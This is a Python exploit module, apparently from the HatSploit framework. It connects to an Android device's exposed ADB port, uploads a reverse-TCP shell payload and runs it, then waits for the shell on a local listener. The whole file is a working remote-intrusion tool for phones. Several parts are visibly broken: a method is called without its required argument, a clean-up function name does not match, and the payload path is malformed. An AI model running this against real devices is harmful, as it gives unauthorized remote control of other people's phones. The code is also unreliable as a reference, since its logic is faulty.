#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import os

from core.lib.module import Module
from utils.handler.handler import Handler
from utils.string.string import StringTools
from utils.adb.adb import ADBClient
from utils.tcp.tcp import TCPClient


class HatSploitModule(Module, Handler, StringTools, ADBClient, TCPClient):
    details = {
        'Name': "Android ADB Payload Dropper",
        'Module': "exploit/android/adb/payload_dropper",
        'Authors': [
            'enty8080'
        ],
        'Description': "Android ADB remotely upload and execute payload.",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Platform': "android",
        'Risk': "high"
    }

    payload = {
        'Description': "Payload to use.",
        'Value': "android/armle/shell_reverse_tcp",
        'Categories': [
            'stager'
        ],
        'Architectures': [
            'armle',
            'aarch64'
        ],
        'Platforms': [
            'android'
        ],
        'Types': [
            'reverse_tcp'
        ]
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'SRVHOST': {
            'Description': "Local host to listen on.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'SRVPORT': {
            'Description': "Local port to listen on.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def adb_clean_up(self):
        self.output_process("Stopping ADB server...")

        if not self.stop_adb_server():
            self.output_error("Failed to stop ADB server!")

    def adb_upload_payload(self, command):
        temp_file = '/tmp/' + self.random_string()
        self.output_process(f"Outputting payload to {temp_file}...")

        with open(temp_file, 'wb') as f:
            f.write(self.payload['Payload'])

        self.output_process("Attempting to upload payload...")
        self.execute_adb_command('push', f"{temp_file} /data/local/tmp/")

        self.output_process("Executing payload on device...")
        self.execute_adb_command('shell', f"/data/local/tmp/{temp_file}")

    def adb_start_server(self):
        self.output_process("Starting ADB server...")

        if not self.start_adb_server():
            self.output_error("Failed to start ADB server!")
            return

    def run(self):
        remote_host, local_host, local_port = self.parse_options(self.options)

        self.output_process("Checking ADB installation...")
        if not self.check_adb_installation():
            self.output_error("ADB is not installed!")
            return

        self.adb_start_server()
        self.output_process(f"Exploiting {remote_host}...")

        if not self.connect_adb_client(remote_host):
            self.output_error("Exploit failed!")
            self.clean_up()
            return

        if not self.check_connected(remote_host):
            self.output_error("Exploit failed!")
            self.clean_up()
            return

        self.output_process("Executing payload stage...")
        self.adb_upload_payload()
        self.clean_up()

        self.handle_session(
            host=local_host,
            port=local_port,
            method="reverse",
            payload=self.payload,
            timeout=10,
            staged=False
        )
